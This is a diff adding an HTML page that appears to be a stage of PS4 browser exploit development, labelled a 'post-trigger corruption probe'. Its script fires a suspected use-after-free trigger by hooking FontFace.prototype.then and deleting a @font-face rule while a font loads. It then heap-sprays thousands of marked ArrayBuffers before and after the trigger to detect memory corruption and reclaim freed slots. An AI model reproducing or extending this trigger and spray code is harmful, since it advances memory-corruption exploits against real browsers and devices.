@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Phase 3 — Post-trigger corruption probe</title>
+<style>
+body { font-family: monospace; background: #111; color: #0f0; padding: 12px; }
+#status { font-size: 18px; margin-bottom: 8px; }
+#log { height: 80vh; overflow: auto; border: 1px solid #333; padding: 8px; font-size: 12px; }
+.note { color: #aaa; font-size: 12px; margin-bottom: 8px; }
+</style>
+<style id="s">
+@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
+</style>
+</head>
+<body>
+<div id="status">probing...</div>
+<p class="note">ONE trigger per page load. Fully quit browser between runs. Look for corruption in sprayed buffers.</p>
+<div id="log"></div>
+<script>
+(function () {
+    var logEl = document.getElementById('log');
+    var statusEl = document.getElementById('status');
+    window.ps4log = function (msg) {
+        var line = document.createElement('div');
+        line.textContent = '[' + performance.now().toFixed(1) + 'ms] ' + msg;
+        logEl.appendChild(line);
+    };
+    window.ps4status = function (msg, color) {
+        statusEl.textContent = msg;
+        if (color) statusEl.style.color = color;
+    };
+})();
+
+var SPRAY_COUNT = 4000;
+var SPRAY_SIZE = 256; // 256 x u32 = 1KB per view
+
+function snapshot(view) {
+    var s = '';
+    for (var i = 0; i < 8; i++) s += view[i].toString(16) + ' ';
+    return s;
+}
+
+function spray() {
+    var views = [];
+    for (var i = 0; i < SPRAY_COUNT; i++) {
+        var ab = new ArrayBuffer(SPRAY_SIZE * 4);
+        var v = new Uint32Array(ab);
+        for (var j = 0; j < 8; j++) v[j] = 0x41414141;
+        views.push(v);
+    }
+    return views;
+}
+
+function scan(views, label, before) {
+    var changed = 0;
+    var first = -1;
+    for (var i = 0; i < views.length; i++) {
+        var cur = snapshot(views[i]);
+        if (before && before[i] !== cur) {
+            changed++;
+            if (first < 0) first = i;
+            if (changed <= 5) {
+                ps4log(label + ' buf[' + i + '] changed: ' + before[i] + ' -> ' + cur);
+            }
+        } else if (!before && views[i][0] !== 0x41414141) {
+            changed++;
+            if (first < 0) first = i;
+            if (changed <= 5) {
+                ps4log(label + ' buf[' + i + '] unexpected: ' + snapshot(views[i]));
+            }
+        }
+    }
+    ps4log(label + ': ' + changed + ' buffers anomalous' + (first >= 0 ? ', first=' + first : ''));
+    return changed;
+}
+
+function saveSnaps(views) {
+    var snaps = [];
+    for (var i = 0; i < views.length; i++) snaps.push(snapshot(views[i]));
+    return snaps;
+}
+
+function minimalTrigger() {
+    var A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+    document.fonts.add(A);
+    void A.loaded;
+
+    var fired = false;
+    Object.defineProperty(FontFace.prototype, 'then', {
+        configurable: true,
+        get: function () {
+            if (!fired && this === A) {
+                fired = true;
+                ps4log('TRIGGER FIRED');
+                document.getElementById('s').sheet.deleteRule(0);
+                document.body.offsetTop;
+            }
+            return undefined;
+        }
+    });
+
+    document.fonts.load('1em x', 'AB');
+    return A;
+}
+
+window.onload = function () {
+    ps4log('Phase 3 — post-trigger corruption probe');
+    ps4log('UA: ' + navigator.userAgent);
+
+    // --- experiment A: spray BEFORE trigger, scan AFTER ---
+    ps4log('--- A: pre-spray then trigger ---');
+    var pre = spray();
+    ps4log('pre-sprayed ' + SPRAY_COUNT + ' buffers');
+    var snapA = saveSnaps(pre);
+
+    var faceA = minimalTrigger();
+
+    setTimeout(function () {
+        var hitA = scan(pre, 'post-trigger scan', snapA);
+
+        // --- experiment B: spray AFTER trigger (reclaim freed slots) ---
+        ps4log('--- B: post-trigger spray ---');
+        var post = spray();
+        var hitB = scan(post, 'post-spray scan', null);
+
+        // --- experiment C: keep references to FontFace, check state ---
+        ps4log('--- C: FontFace state ---');
+        try {
+            ps4log('A.status = ' + faceA.status);
+            ps4log('A.family = ' + faceA.family);
+        } catch (e) {
+            ps4log('A access threw: ' + e);
+        }
+
+        try {
+            faceA.loaded.then(function () {
+                ps4log('A.loaded resolved AFTER trigger — interesting');
+            }).catch(function (e) {
+                ps4log('A.loaded rejected: ' + e);
+            });
+        } catch (e) {
+            ps4log('A.loaded access threw: ' + e);
+        }
+
+        // --- experiment D: document.fonts state ---
+        ps4log('--- D: document.fonts.size = ' + document.fonts.size);
+
+        if (hitA > 0 || hitB > 0) {
+            ps4status('POSSIBLE CORRUPTION — check log', '#ff0');
+            ps4log('>>> buffers changed — worth investigating further <<<');
+        } else {
+            ps4status('no buffer anomalies this run', '#0f0');
+            ps4log('no spray corruption detected (does not mean no native corruption)');
+        }
+
+        ps4log('quit browser fully, reopen, run again');
+    }, 1000);
+};
+</script>
+</body>
+</html>
